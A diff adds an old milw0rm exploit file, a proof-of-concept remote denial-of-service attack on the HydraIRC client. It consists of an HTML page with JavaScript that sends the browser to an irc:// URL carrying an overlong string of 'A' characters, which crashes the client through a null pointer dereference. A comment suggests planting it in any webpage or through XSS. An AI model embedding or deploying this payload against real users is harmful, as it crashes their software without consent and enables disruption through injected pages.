@@ -1,0 +1,24 @@
+############################################################
+# Vendor : http://www.hydrairc.com/
+# Remote : Yes
+# Impact : Remote crash
+# Bug : Null Pointer Dereference
+# Working on : all browsers
+#
+#  Include this in any webpage or xss & see it with any browser , wait ~15sec, and boom.
+#
+# PoC :
+#
+<html>
+<head> <title>HydraIRC Remote Denial Of Service Poc </title></head>
+<body>
+<script>
+var site = 'irc://127.0.0.1/'
+var buf = 'A';
+     while (buf.length <= 560) buf = buf + 'A';
+document.location.href=site +buf
+</script>
+</body>
+</html>
+
+# milw0rm.com [2008-08-04]
